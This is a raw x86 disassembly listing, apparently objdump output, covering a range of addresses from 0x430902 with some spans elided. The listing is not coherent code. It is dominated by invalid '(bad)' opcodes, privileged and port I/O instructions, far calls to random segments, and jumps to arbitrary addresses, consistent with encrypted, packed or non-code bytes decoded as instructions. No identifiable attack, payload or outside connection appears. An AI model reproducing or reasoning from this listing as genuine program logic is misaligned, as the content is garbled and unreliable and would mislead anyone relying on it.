  430902:	xchg   edi,eax
  430903:	sub    ebx,DWORD PTR es:0xc5e9e6ef
  43090a:	call   0xb2af:0xfdb98cf7
  430911:	mov    esp,fs
  430913:	cmp    eax,0x41229832
  430918:	out    dx,eax
  430919:	(bad)  
  43091a:	sub    ebx,esp
  43091c:	cmp    eax,0x99664d4d
  430921:	dec    ebp
  430922:	movlps QWORD PTR [ebp-0x660427fe],xmm1
  430929:	xor    DWORD PTR [edi+0x52],edx
  43092c:	fisub  WORD PTR cs:[esi+0x50]
  430930:	sub    eax,0xee32d849
  430935:	std    
  430936:	repnz fsubr QWORD PTR [edx+esi*8+0x5eabd4a8]
  43093e:	dec    eax
  43093f:	add    eax,0x4c6c87ec
  430944:	sbb    al,0xe8
  430946:	and    edi,DWORD PTR [eax]
  430948:	push   ebp
  430949:	pop    esp
  43094a:	std    
  43094b:	pop    ebp
  43094c:	mov    ebp,0xb2bf5a65
  430952:	and    DWORD PTR [ebx-0x6c2a5c2f],eax
  430958:	mov    esi,0x89a075e0
  43095d:	cmp    DWORD PTR [edx-0x47e88e90],esp
  430963:	push   0x8c2d7c2e
  430968:	neg    DWORD PTR [edi]
  43096a:	xor    DWORD PTR [ecx-0x2c],ebx
  43096d:	jle    0x4308fd
  43096f:	jno    0x4309b0
  430971:	mov    ds:0x3437ebf7,al
  430976:	dec    edi
  430977:	leave  
  430978:	xchg   edi,eax
  430979:	pop    ebp
  43097a:	hlt    
  43097b:	mov    ecx,cr2
  43097e:	dec    edi
  43097f:	sub    edx,DWORD PTR [ecx+edx*4-0x7c]
  430983:	mov    BYTE PTR [ecx+0x717d2d59],dl
  430989:	test   al,0xf6
  43098b:	cmp    ebp,DWORD PTR [eax+0x7b0c83c9]
  430991:	test   al,0x6d
  430993:	sub    al,BYTE PTR [esi-0x12f93573]
  430999:	sub    BYTE PTR [ebp+0x93bb086],ch
  43099f:	mov    bh,0x11
  4309a1:	aam    0x5d
  4309a3:	loop   0x430937
  4309a5:	xlat   BYTE PTR ds:[ebx]
  4309a6:	push   eax
  4309a7:	rcl    DWORD PTR [esi+0x2c],cl
  4309aa:	mov    WORD PTR [edx-0x1bad94dc],gs
  4309b0:	lock (bad) 
  4309b2:	and    BYTE PTR cs:[edi+0x2a],bl
  4309b6:	les    esp,FWORD PTR [ebx+0x20]
  4309b9:	in     eax,dx
  4309ba:	stos   DWORD PTR es:[edi],eax
  4309bb:	push   ebx
  4309bc:	adc    ch,ah
  4309be:	mov    ebx,0xc7d9f3
	...
  430a33:	add    BYTE PTR [ebx],bl
  430a35:	out    dx,eax
  430a36:	shl    BYTE PTR [esi],0xf4
  430a39:	aas    
  430a3a:	(bad)  
  430a3b:	out    dx,eax
  430a3c:	fwait
  430a3d:	aaa    
  430a3e:	call   0x2bdcf037
  430a43:	scas   eax,DWORD PTR es:[edi]
  430a44:	cld    
  430a45:	add    DWORD PTR [edx],eax
  430a47:	add    dh,dh
  430a49:	add    BYTE PTR [eax],al
  430a4b:	add    BYTE PTR [edi],bl
  430a4d:	xchg   ebx,eax
  430a4e:	sahf   
  430a4f:	xor    ebx,DWORD PTR [esi-0x6d2faf5e]
  430a55:	push   es
  430a56:	cwde   
  430a57:	adc    cl,BYTE PTR [ebx+0x51]
  430a5a:	in     al,dx
  430a5b:	jbe    0x430a99
  430a5d:	sbb    al,0x3b
  430a5f:	gs push ss
  430a61:	xlat   BYTE PTR ds:[ebx]
  430a62:	rol    DWORD PTR [edi],cl
  430a64:	test   eax,0xcfaa7c18
  430a69:	out    dx,eax
  430a6a:	retf   0xc0a9
  430a6d:	into   
  430a6e:	sbb    BYTE PTR [esi],al
  430a70:	xor    BYTE PTR [ebx],ah
  430a72:	loope  0x430a48
  430a74:	test   DWORD PTR [ebx],0xa921ded2
  430a7a:	inc    edi
  430a7b:	mov    cl,0xc6
  430a7d:	jl     0x430a17
  430a7f:	xchg   esp,eax
  430a80:	std    
  430a81:	xor    cl,BYTE PTR [ebx]
  430a83:	adc    DWORD PTR [ebp-0x4e71e7eb],edx
  430a89:	mov    ah,0xd2
  430a8b:	or     ecx,DWORD PTR [ebx-0xecd9a52]
  430a91:	push   esi
  430a92:	ins    DWORD PTR es:[edi],dx
  430a93:	scas   al,BYTE PTR es:[edi]
  430a94:	jo     0x430ab0
  430a96:	push   ebp
  430a97:	xchg   edx,eax
  430a98:	xchg   BYTE PTR [eax-0x63b2603f],ch
  430a9e:	aaa    
  430a9f:	mov    edx,ecx
  430aa1:	cmp    eax,0x6
  430aa4:	dec    esp
  430aa5:	out    dx,eax
  430aa6:	std    
  430aa7:	adc    al,0x2c
  430aa9:	mov    al,ds:0x409b5646
  430aae:	cmp    DWORD PTR [edx+eiz*8-0x35],ebx
  430ab2:	call   0x9e98:0x44fe5f95
  430ab9:	sub    eax,0x4f00d5ed
  430abe:	cmp    edi,esi
  430ac0:	xlat   BYTE PTR ds:[ebx]
  430ac1:	or     BYTE PTR [edi*1-0x470b997d],dh
  430ac8:	push   esi
  430ac9:	popa   
  430aca:	cdq    
  430acb:	sbb    al,0xd2
  430acd:	or     dh,bl
  430acf:	shr    eax,cl
  430ad1:	(bad)  
  430ad3:	push   es
  430ad4:	sub    ch,0xc3
  430ad7:	ins    DWORD PTR es:[edi],dx
  430ad8:	mov    ch,0xb4
  430ada:	call   0xdee2:0xaa8561cb
  430ae1:	pushf  
  430ae2:	add    ebp,esp
  430ae4:	aad    0x87
  430ae6:	test   BYTE PTR [esi-0xf44fe4a],ah
  430aec:	mov    edi,0xf176ced7
  430af1:	cmp    esi,DWORD PTR [ebx-0xdbb40d1]
  430af7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430af8:	cmc    
  430af9:	sbb    DWORD PTR [edi+0x6a],0xe85d2bef
  430b00:	sub    esi,DWORD PTR [esi-0x3a5eae8f]
  430b06:	pop    edx
  430b07:	xchg   ecx,eax
  430b08:	adc    BYTE PTR [eax-0x40726a62],ch
  430b0e:	sbb    al,0x7c
  430b10:	test   al,0x90
  430b12:	dec    esp
  430b13:	sbb    al,0xe3
  430b15:	xchg   ecx,eax
  430b16:	pushf  
  430b17:	mov    esp,0xd6a1d7ac
  430b1c:	ins    BYTE PTR es:[edi],dx
  430b1d:	addr16 jg 0x430ad5
  430b20:	mov    al,0xbb
  430b22:	xchg   DWORD PTR [esi],ebx
  430b24:	add    ah,dh
  430b26:	mov    ds:0xab1462e3,al
  430b2b:	sar    DWORD PTR ds:0xc80158f8,1
  430b31:	in     al,dx
  430b32:	ds sbb dl,ch
  430b35:	pop    edi
  430b36:	mov    eax,0xb2e4c2f3
  430b3b:	fwait
  430b3c:	push   edi
  430b3d:	call   0x0:0x3ea91265
	...
  430bb4:	or     ecx,DWORD PTR [eax+0x3ba319a3]
  430bba:	mov    ebx,0x4217e69a
  430bbf:	aas    
  430bc0:	xlat   BYTE PTR ds:[ebx]
  430bc1:	dec    esi
  430bc2:	and    BYTE PTR ds:0x202f2,al
  430bc8:	test   BYTE PTR [eax],0x0
  430bcb:	add    BYTE PTR [ebx+0x6eb13c88],bl
  430bd1:	(bad)  
  430bd2:	mul    BYTE PTR [edi+0x74]
  430bd5:	call   0xea2dfdee
  430bda:	call   0x21d7cc96
  430bdf:	mov    eax,ds:0x8c280954
  430be4:	inc    eax
  430be5:	push   ebx
  430be6:	dec    edi
  430be7:	sar    BYTE PTR [esi+0x6f32f63b],cl
  430bed:	arpl   WORD PTR [eax+0x1a],bx
  430bf0:	inc    DWORD PTR [eax+0x15]
  430bf3:	dec    edx
  430bf4:	add    ebp,ebx
  430bf6:	retf   
  430bf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430bf8:	lods   eax,DWORD PTR ds:[esi]
  430bf9:	push   ecx
  430bfa:	or     BYTE PTR [ebp+0x1e7c377b],dh
  430c00:	sub    al,0xc2
  430c02:	call   FWORD PTR [edx]
  430c04:	das    
  430c05:	fadd   st,st(6)
  430c07:	or     al,0x79
  430c09:	ja     0x430bed
  430c0b:	xor    BYTE PTR [ebp+esi*8-0x29ebab20],bl
  430c12:	adc    cl,BYTE PTR [ebx]
  430c14:	dec    ebp
  430c15:	sub    cl,ch
  430c17:	adc    bh,al
  430c19:	pop    ebp
  430c1a:	scas   eax,DWORD PTR es:[edi]
  430c1b:	fadd   QWORD PTR [bx+si+0x8b0]
  430c20:	rcl    BYTE PTR [ecx-0x23c622b8],cl
  430c26:	jae    0x430bad
  430c28:	jb     0x430c81
  430c2a:	(bad)  [edx-0x7abb777a]
  430c30:	sbb    ah,BYTE PTR [ebp+0x7e495621]
  430c36:	jne    0x430c46
  430c38:	push   ebx
  430c39:	mov    ebp,0x33326656
  430c3e:	imul   BYTE PTR [eax]
  430c40:	sbb    BYTE PTR [eax],bh
  430c42:	jmp    0x430ca4
  430c44:	and    edi,esp
  430c46:	xchg   BYTE PTR [edi+0x1c],bl
  430c49:	fistp  WORD PTR [edx]
  430c4b:	test   DWORD PTR [eax+edx*4+0x6f],esi
  430c4f:	stos   DWORD PTR es:[edi],eax
  430c50:	mov    dl,0xbd
  430c52:	pop    esp
  430c53:	popa   
  430c54:	cmc    
  430c55:	stos   DWORD PTR es:[edi],eax
  430c56:	mov    ah,0x34
  430c58:	mov    dh,0xbd
  430c5a:	inc    ebx
  430c5b:	push   ss
  430c5c:	push   edi
  430c5d:	push   0x9fb18321
  430c62:	mov    DWORD PTR [eax-0x36],edi
  430c65:	jmp    0x1824:0x84971f10
  430c6c:	mov    WORD PTR [ebp-0x79d7d9ee],gs
  430c72:	cs (bad) 
  430c74:	pop    ss
  430c75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430c76:	mov    ebp,DWORD PTR [eax-0x18c2c927]
  430c7c:	ds xor ah,dl
  430c7f:	repz lea esp,[ebx+0x65]
  430c83:	test   al,0x22
  430c85:	jp     0x430cf5
  430c87:	sub    BYTE PTR [edi],bl
  430c89:	and    esi,DWORD PTR [esi-0x1f4bb606]
  430c8f:	inc    esi
  430c90:	fabs   
  430c92:	(bad)  [edx+0x46]
  430c95:	pop    ecx
  430c96:	out    0x78,eax
  430c98:	jmp    0x430c36
  430c9a:	fbld   TBYTE PTR [edx+0x13260817]
  430ca0:	mov    DWORD PTR [eax],edx
  430ca2:	push   esp
  430ca3:	ret    0xbec4
  430ca6:	xlat   BYTE PTR ds:[ebx]
  430ca7:	popf   
  430ca8:	rcl    BYTE PTR [ecx-0x3f115d5c],1
  430cae:	or     eax,0x85a4b096
  430cb3:	dec    ebp
  430cb4:	mov    ch,0x14
  430cb6:	push   ecx
  430cb7:	adc    eax,0x7ddef71b
  430cbc:	mov    dl,0xa1
  430cbe:	lock inc ebp
  430cc0:	fldcw  WORD PTR [eax+eax*1]
	...
  430d33:	add    BYTE PTR [eax-0x40],cl
  430d36:	ret    0xcaf0
  430d39:	bnd jp 0x430d34
  430d3c:	ror    BYTE PTR [ecx],1
  430d3e:	cdq    
  430d3f:	jl     0x430d63
  430d41:	cmp    al,0xdb
  430d43:	cmp    eax,ebp
  430d45:	add    eax,DWORD PTR [edx]
  430d47:	add    dh,dh
  430d49:	add    BYTE PTR [eax],al
  430d4b:	add    BYTE PTR [edx-0x7d12fc67],al
  430d51:	loope  0x430cfd
  430d53:	mov    edx,0x7fb10773
  430d58:	sub    DWORD PTR [esi-0xac6480b],edi
  430d5e:	ins    DWORD PTR es:[edi],dx
  430d5f:	shr    BYTE PTR [ebx-0xd9ba337],cl
  430d65:	cmc    
  430d66:	retf   
  430d67:	std    
  430d68:	cmp    al,0x4f
  430d6a:	mov    dl,0xb6
  430d6c:	ret    
  430d6d:	fisttp WORD PTR [ebx+0x66a7c67f]
  430d73:	sbb    al,0xf
  430d75:	pushf  
  430d76:	cmp    al,0xfa
  430d78:	sbb    dl,cl
  430d7a:	cmp    al,0x96
  430d7c:	hlt    
  430d7d:	adc    esp,DWORD PTR [esi+eiz*4+0x21]
  430d81:	xor    bh,BYTE PTR [edi+0x3c]
  430d84:	mov    edx,0xb47eaf81
  430d89:	sub    DWORD PTR [edi+0x1],ecx
  430d8c:	xor    edx,esi
  430d8e:	hlt    
  430d8f:	dec    esp
  430d90:	cdq    
  430d91:	dec    ebp
  430d92:	hlt    
  430d93:	sbb    al,0x4e
  430d95:	int    0x59
  430d97:	test   eax,0x2d535e2e
  430d9c:	lea    ebp,ds:[esi]
  430d9f:	sub    esi,esi
  430da1:	jb     0x430deb
  430da3:	sbb    eax,0x79776900
  430da8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430da9:	shl    DWORD PTR [eax],0x92
  430dac:	in     eax,0x9b
  430dae:	or     DWORD PTR [ebx],ebx
  430db0:	or     BYTE PTR ds:0x18ac,dl
  430db5:	mov    ds:0x76eb9465,al
  430dbb:	sub    BYTE PTR [edx+ebx*1],al
  430dbe:	xor    eax,0x874a8718
  430dc3:	mov    bh,0xba
  430dc5:	fcomp  QWORD PTR [ecx]
  430dc7:	mov    gs,WORD PTR [ebx]
  430dc9:	or     DWORD PTR [esi+0x62ddcee6],eax
  430dcf:	sub    dh,BYTE PTR [ebx]
  430dd1:	dec    esp
  430dd2:	retf   
  430dd3:	pop    ebp
  430dd4:	pop    ecx
  430dd5:	iret   
  430dd6:	xor    al,0x13
  430dd8:	icebp  
  430dd9:	test   DWORD PTR [edi+0x18fd10e],esp
  430ddf:	add    BYTE PTR [ecx+0x74],bl
  430de2:	fdivr  st,st(6)
  430de4:	lods   eax,DWORD PTR ds:[esi]
  430de5:	pop    eax
  430de6:	ja     0x430e17
  430de8:	adc    DWORD PTR [ecx+0x44],eax
  430deb:	push   esi
  430dec:	xor    al,0x7b
  430dee:	stc    
  430def:	cs xchg esp,eax
  430df1:	inc    edi
  430df2:	ret    
  430df3:	xchg   edx,eax
  430df4:	mov    ds,WORD PTR [ecx+0x67]
  430df7:	mov    ecx,0xe2919007
  430dfc:	daa    
  430dfd:	leave  
  430dfe:	pop    eax
  430dff:	adc    ebx,ecx
  430e01:	pusha  
  430e02:	fs jo  0x430dbf
  430e05:	sub    eax,0xcbb405f2
  430e0a:	xor    ebx,DWORD PTR [esi]
  430e0c:	xor    eax,0xcbe74d86
  430e11:	mov    bl,0x36
  430e13:	mov    al,0x9f
  430e15:	mov    ebp,0xccd3991e
  430e1a:	cli    
  430e1b:	adc    eax,0x6bcea55f
  430e20:	shl    DWORD PTR [esp+ebp*2+0x3af92b5d],1
  430e27:	in     eax,0x8d
  430e29:	int3   
  430e2a:	test   al,0x76
  430e2c:	ds or  al,0xe1
  430e2f:	xor    al,0x10
  430e31:	xor    DWORD PTR [edi-0x6498be3b],ebx
  430e37:	mov    esi,0x79f89869
  430e3c:	ficom  WORD PTR [eax+0x2215cca2]
	...
  430eb2:	add    BYTE PTR [eax],al
  430eb4:	add    al,0x67
  430eb6:	std    
  430eb7:	aaa    
  430eb8:	(bad)  
  430eb9:	mov    edi,0x8a6677ce
  430ebe:	retf   
  430ebf:	jne    0x430e48
  430ec1:	and    eax,eax
  430ec3:	aam    0xde
  430ec5:	add    al,0x2
  430ec7:	add    dh,bl
  430ec9:	add    BYTE PTR [eax],al
  430ecb:	add    cl,ch
  430ecd:	ror    edi,cl
  430ecf:	pop    edi
  430ed0:	outs   dx,BYTE PTR ds:[esi]
  430ed1:	inc    esi
  430ed2:	rcr    DWORD PTR [edx],0x30
  430ed5:	in     al,dx
  430ed6:	test   BYTE PTR [edi],al
  430ed8:	aas    
  430ed9:	and    dl,BYTE PTR [esi]
  430edb:	jl     0x430e82
  430edd:	rol    BYTE PTR [ecx+0x42d3e840],0xf8
  430ee4:	fcomp  QWORD PTR [ebx+0x15]
  430ee7:	cmp    ecx,eax
  430ee9:	inc    ebp
  430eea:	aas    
  430eeb:	inc    ecx
  430eec:	add    eax,0xdfdf091c
  430ef1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430ef2:	adc    DWORD PTR [ebp+0x9d9fd6],edx
  430ef8:	add    dl,BYTE PTR [ebp+0x5]
  430efb:	je     0x430eb4
  430efd:	adc    ah,al
  430eff:	and    cl,BYTE PTR [edx]
  430f01:	dec    edx
  430f02:	(bad)  
  430f03:	xchg   edx,eax
  430f04:	ds rol ebx,cl
  430f07:	pop    eax
  430f08:	or     al,0xa6
  430f0a:	loope  0x430f26
  430f0c:	add    ch,BYTE PTR [edi+ebx*2-0x66]
  430f10:	lea    ebx,[edx+0x37]
  430f13:	jl     0x430f7b
  430f15:	and    DWORD PTR [ecx-0x4f],esp
  430f18:	and    eax,0x31d7b747
  430f1d:	test   eax,0xd7da703f
  430f22:	xchg   DWORD PTR [edi-0x50d1bffd],edi
  430f28:	jns    0x430f14
  430f2a:	mov    cl,0x4d
  430f2c:	loop   0x430f8a
  430f2e:	xchg   ebp,eax
  430f2f:	cld    
  430f30:	add    al,0x49
  430f32:	dec    esi
  430f33:	lahf   
  430f34:	jle    0x430ec4
  430f36:	dec    ebx
  430f37:	in     al,dx
  430f38:	inc    ebp
  430f39:	mov    bh,0x83
  430f3b:	mov    al,0x2a
  430f3d:	loope  0x430ef3
  430f3f:	push   edx
  430f40:	add    ebx,DWORD PTR [edi-0x4e]
  430f43:	xchg   esp,eax
  430f44:	or     eax,0xc804b66b
  430f49:	jno    0x430f82
  430f4b:	ins    BYTE PTR es:[edi],dx
  430f4c:	jl     0x430ece
  430f4e:	jmp    0x9d58:0x768f74c6
  430f55:	mov    dl,0x4b
  430f57:	cmc    
  430f58:	cmp    dh,0x51
  430f5b:	fcom   QWORD PTR [eax+0x52]
  430f5e:	dec    edi
  430f5f:	ror    esp,cl
  430f61:	lea    edi,[ebx-0x6]
  430f64:	mov    edi,0x8d3c9ed1
  430f69:	pop    esi
  430f6a:	out    dx,eax
  430f6b:	(bad)  
  430f6c:	js     0x430f54
  430f6e:	repz pop edi
  430f70:	imul   esp,DWORD PTR [esi],0xe506a3ba
  430f76:	or     edi,DWORD PTR [edx]
  430f78:	imul   esp,DWORD PTR [esi],0x41
  430f7b:	mov    ds:0x1629b5f3,eax
  430f80:	sub    edx,DWORD PTR [edi]
  430f82:	mov    ebx,0x51bdd3d4
  430f87:	lock pop esp
  430f89:	fsubr  st(1),st
  430f8b:	psllw  mm7,QWORD PTR [eax]
  430f8e:	idiv   edx
  430f90:	fnsave [edi]
  430f92:	mov    dh,0x65
  430f94:	mov    ebx,0xeb1336c7
  430f99:	pop    ds
  430f9a:	stos   BYTE PTR es:[edi],al
  430f9b:	mov    al,0x8b
  430f9d:	add    eax,0xe554b82e
  430fa2:	hlt    
  430fa3:	push   eax
  430fa4:	das    
  430fa5:	sub    BYTE PTR [edi+0x7a4fc0],0x0
	...
  430fb4:	dec    ebp
  430fb5:	push   ebp
  430fb6:	mov    DWORD PTR [ebx-0x7e9f13f8],ecx
  430fbc:	mov    esp,ebp
  430fbe:	or     al,ah
  430fc0:	dec    ebp
  430fc1:	add    bh,al
  430fc3:	add    BYTE PTR [eax],cl
  430fc5:	add    BYTE PTR [eax],al
  430fc7:	mov    DWORD PTR [eax],0x3ef44545
  430fcd:	add    BYTE PTR ss:[ebp-0x70b6375],al
  430fd4:	retf   
  430fd5:	(bad)  
  430fd6:	enter  0x4d45,0xb8
  430fda:	mov    edi,DWORD PTR [ecx]
  430fdc:	hlt    
  430fdd:	test   ebx,ecx
  430fdf:	pushf  
  430fe0:	enter  0x4df8,0x8b
  430fe4:	mov    DWORD PTR [ebp+0x8],0x894708
  430feb:	inc    ebp
  430fec:	mov    ebp,0xff8bfffc
  430ff1:	dec    ebp
  430ff2:	mov    ch,0xf4
  430ff4:	call   DWORD PTR [ebx-0x1]
  430ff7:	mov    ebx,0x8005122
  430ffc:	call   DWORD PTR [ecx+0x8]
  430fff:	pop    es
  431000:	jmp    0xb8:0x9cb4533
  431007:	cdq    
  431008:	mov    esi,DWORD PTR [edx-0xc]
  43100b:	xor    al,bl
  43100d:	add    BYTE PTR [ecx+0x3c83203],bl
  431013:	mov    DWORD PTR [ecx+0x45c4084d],ecx
  431019:	mov    eax,DWORD PTR [ebx-0xb87b3]
  43101f:	xor    eax,DWORD PTR [eax]
  431021:	retf   
  431022:	ret    
  431023:	add    eax,esi
  431025:	enter  0x8945,0x64
  431029:	dec    ebp
  43102a:	sbb    ah,cl
  43102c:	add    BYTE PTR [ebx-0xb87b277],cl
  431032:	dec    DWORD PTR [ebx-0xbcfb275]
  431038:	test   DWORD PTR [ebx],esi
  43103a:	dec    ebx
  43103c:	inc    DWORD PTR [ebx]
  43103e:	inc    eax
  43103f:	enter  0x8989,0x64
  431043:	(bad)  
  431044:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  431048:	cld    
  431049:	dec    DWORD PTR [ebp-0xa90001]
  43104f:	push   edi
  431050:	mov    BYTE PTR [edx+0x1],ch
  431053:	and    BYTE PTR [eax],al
  431055:	pop    ecx
  431056:	inc    ebp
  431057:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  43105d:	push   0xffffff89
  43105f:	pop    ecx
  431060:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431061:	dec    ebp
  431062:	add    BYTE PTR [ecx+0x45fc088b],cl
  431068:	jne    0x4310b2
  43106a:	lea    eax,[eax]
  43106c:	fs (bad) 
  43106e:	dec    DWORD PTR [eax]
  431070:	mov    DWORD PTR [eax],eax
  431072:	test   al,0x0
  431074:	add    BYTE PTR [ebp-0x18],cl
  431077:	xor    ebp,DWORD PTR [edx]
  431079:	add    eax,DWORD PTR [eax]
  43107b:	mov    eax,eax
  43107d:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  431084:	inc    ebp
  431085:	mov    DWORD PTR [ebx+0x459408],ecx
  43108b:	popa   
  43108c:	mov    esp,DWORD PTR [ebp-0x75]
  43108f:	(bad)  
  431090:	cld    
  431091:	inc    eax
  431092:	cmp    bh,0x1
  431095:	lea    eax,[eax]
  431097:	and    BYTE PTR [eax],al
  431099:	inc    DWORD PTR [ecx-0x18]
  43109c:	mov    ecx,DWORD PTR [ebx]
  43109e:	cld    
  43109f:	add    BYTE PTR [ecx+0x75014d],cl
  4310a5:	(bad)  
  4310a6:	xchg   ebp,eax
  4310a7:	sar    bh,1
  4310a9:	inc    eax
  4310aa:	inc    DWORD PTR [eax]
  4310ac:	mov    eax,DWORD PTR [ebp-0x4]
  4310af:	xor    edx,DWORD PTR [edx+0x7201be]
  4310b5:	add    BYTE PTR [edx],dl
  4310b7:	(bad)  
  4310b8:	nop
  4310b9:	inc    ebp
  4310ba:	add    BYTE PTR [ebx-0x5afb0c00],cl
  4310c0:	mov    al,0xff
  4310c2:	add    bh,bh
  4310c4:	add    BYTE PTR [ebx],dh
  4310c6:	inc    DWORD PTR [ebx]
  4310c8:	sbb    al,0x89
  4310ca:	jne    0x4310a8
  4310cc:	mov    esp,DWORD PTR [ecx+0x4500fc]
  4310d2:	mov    eax,DWORD PTR [ebp-0xff0048]
  4310d8:	mov    DWORD PTR [eax-0x70],0xe870e989
  4310df:	inc    DWORD PTR [ebp-0x75]
  4310e2:	(bad)  [esi+ebp*8]
  4310e5:	test   DWORD PTR [esi-0x1],esp
  4310e8:	inc    ebp
  4310e9:	(bad)  
  4310ea:	aas    
  4310eb:	inc    ebp
  4310ec:	(bad)  
  4310ed:	lea    edi,[eax+edi*2-0x1]
  4310f1:	inc    edi
  4310f3:	mov    DWORD PTR [ecx],edi
  4310f5:	mov    al,ds:0x8b8000c7
  4310fa:	call   0x45d0f3fb
  4310ff:	(bad)  
  431100:	out    dx,al
  431101:	(bad)  
  431102:	fisttp WORD PTR [eax+0x8801c7]
  431108:	jecxz  0x43114f
  43110a:	call   0xe83f570e
  43110f:	lea    edi,[edi]
  431111:	(bad)  
  431112:	call   0xcb3c16
  431117:	add    DWORD PTR [ebx-0x7f570400],ecx
  43111d:	add    BYTE PTR [ecx],al
  43111f:	test   DWORD PTR [eax],eax
  431121:	wrmsr  
  431123:	jae    0x431112
  431125:	add    BYTE PTR [eax],al
  431127:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  43112d:	add    esp,edi
  43112f:	add    BYTE PTR [eax+0x450108],al
  431135:	mov    edi,DWORD PTR [ebp-0x6c]
  431138:	add    DWORD PTR [eax],0x4
  43113b:	mov    eax,DWORD PTR [ebp+0x3]
  43113e:	mov    edi,DWORD PTR [esp+edi*8]
  431141:	dec    ebp
  431142:	nop
  431143:	mov    eax,DWORD PTR [ecx]
  431145:	fadd   DWORD PTR [eax]
  431147:	add    BYTE PTR [esi],al
  431149:	lea    eax,[eax]
  43114b:	pusha  
  43114c:	push   eax
  43114d:	inc    DWORD PTR [ebp+0x52]
  431150:	call   DWORD PTR [ebp-0x7b]
  431153:	mov    esi,DWORD PTR [ebp-0x74]
  431156:	mov    eax,DWORD PTR [eax]
  431158:	cld    
  431159:	mov    eax,DWORD PTR [eax+0x880103]
  43115f:	add    BYTE PTR [ebp+0x6a],bh
  431162:	cmp    edi,0x10
  431165:	mov    WORD PTR [ebp+0x0],es
  431168:	mov    edx,DWORD PTR [edx-0x4]
  43116b:	push   ecx
  43116c:	nop
  43116d:	inc    DWORD PTR [ecx]
  43116f:	cld    
  431170:	add    BYTE PTR [ebp-0x24],bh
  431173:	mov    eax,DWORD PTR [eax]
  431175:	cld    
  431176:	push   eax
  431177:	nop
  431178:	inc    ebp
  431179:	add    edi,edi
  43117b:	add    BYTE PTR [ebx+0x4de2f445],cl
  431181:	jmp    0xe33b:0x9403c733
  431188:	movntq QWORD PTR [esi],mm6
  43118b:	mov    DWORD PTR [eax],0xb87e8b98
  431191:	test   ebx,eax
  431193:	jmp    DWORD PTR [edi-0x1]
  431196:	int    0xe9
  431198:	sub    esp,esi
  43119a:	add    eax,DWORD PTR [ebp-0x30]
  43119d:	fild   WORD PTR [ebp+0x3f]
  4311a0:	cmp    eax,edi
  4311a2:	je     0xcc43f7c4
  4311a8:	mov    DWORD PTR [ebp-0x28],0xdb00eb
  4311af:	(bad)  
  4311b0:	jne    0x43113e
  4311b2:	mov    ebx,ecx
  4311b4:	cld    
  4311b5:	jle    0x4311fc
  4311b7:	cmp    ecx,DWORD PTR [ebx+0x50b400]
  4311bd:	inc    ebp
  4311be:	call   0xeb3b4e
  4311c3:	add    BYTE PTR [ebx-0x7f170301],cl
  4311c9:	add    DWORD PTR es:[eax],eax
  4311cc:	add    al,al
  4311ce:	xor    BYTE PTR [eax+0x41],dl
  4311d1:	inc    ebp
  4311d2:	add    BYTE PTR [ebx+0xfcd88b],cl
  4311d8:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  4311de:	add    DWORD PTR [ecx+0x458be845],ecx
  4311e4:	fmul   DWORD PTR [ebx+0x8bb800]
  4311ea:	cld    
  4311eb:	call   0xd83cb0
  4311f0:	dec    DWORD PTR [ebx+0x1090e8ff]
  4311f6:	add    al,al
  4311f8:	push   eax
  4311f9:	es inc ebp
  4311fb:	inc    ebp
  4311fc:	mov    ecx,DWORD PTR [ebx+0xd89c]
  431202:	dec    DWORD PTR [ebx-0x3ff70301]
  431208:	mov    DWORD PTR gs:[eax],eax
  43120b:	call   0x8b6b57d0
  431210:	inc    ebp
  431211:	mov    eax,0xe8d8008b
  431216:	add    BYTE PTR [ecx],ch
  431218:	mov    eax,DWORD PTR [eax]
  43121a:	cld    
  43121b:	mov    eax,eax
  43121d:	call   0x462b2277
  431222:	sub    DWORD PTR [ebx-0x3c743000],ecx
  431228:	cld    
  431229:	mov    BYTE PTR [eax+0x8401c1],0x1
  431230:	xor    BYTE PTR [eax],al
  431232:	push   edi
  431233:	inc    ebp
  431234:	mov    DWORD PTR [ebx],esi
  431236:	in     al,0xb9
  431238:	inc    ebp
  431239:	lea    ecx,[ebx-0x3c370301]
  43123f:	dec    ebp
  431240:	cdq    
  431241:	mov    esi,DWORD PTR [edx]
  431243:	or     BYTE PTR [ebx],al
  431245:	ror    DWORD PTR [ebp-0xfebf79],0x0
  43124c:	call   0x433b96
  431251:	add    BYTE PTR [ebx+0x75fcf4ff],cl
  431257:	jge    0x43128c
  431259:	mov    eax,DWORD PTR [ebx]
  43125b:	cld    
  43125c:	lea    edx,[eax+0xff0120]
  431262:	call   0x433bf6
  431267:	push   eax
  431268:	inc    DWORD PTR [ebp-0x1c]
  43126b:	mov    ecx,DWORD PTR [ebp-0x58]
  43126e:	xor    eax,DWORD PTR [eax]
  431270:	add    edi,edi
  431272:	cmp    ebp,eax
  431274:	jne    0x43129c
  431276:	mov    DWORD PTR [eax],0x8b004dd8
  43127c:	add    BYTE PTR [ebp+eax*2+0x8898b00],bl
  431283:	mov    eax,ebx
  431285:	cld    
  431286:	test   BYTE PTR [eax+0x320199],bh
  43128c:	mov    DWORD PTR [ebp+0x8],esi
  43128f:	xor    eax,DWORD PTR [ebp-0x73]
  431292:	test   DWORD PTR [esp+esi*2-0x1],edi
  431296:	mov    ebp,eax
  431298:	mov    eax,0x33004d29
  43129d:	mov    ecx,DWORD PTR [ebp+0x728008fc]
  4312a3:	add    DWORD PTR [eax],eax
  4312a5:	add    BYTE PTR [ebp+0x30],al
  4312a8:	mov    edx,DWORD PTR [edi-0x48]
  4312ab:	add    ebx,0xffffffe4
  4312ae:	addr16 test ebp,ecx
  4312b1:	je     0x4312de
  4312b3:	mov    eax,DWORD PTR [ebx]
  4312b5:	cld    
  4312b6:	sar    BYTE PTR [eax+0x3b0145],1
  4312bc:	pcmpeqw mm4,mm6
  4312bf:	xor    edi,edi
  4312c1:	lea    ecx,[ebx-0x239c7470]
  4312c7:	add    BYTE PTR [ebp+0x50],cl
  4312ca:	cmp    eax,DWORD PTR [ebp+0x75]
  4312cd:	mov    ebp,DWORD PTR [eax-0x68]
  4312d0:	test   DWORD PTR [eax],eax
  4312d2:	clc    
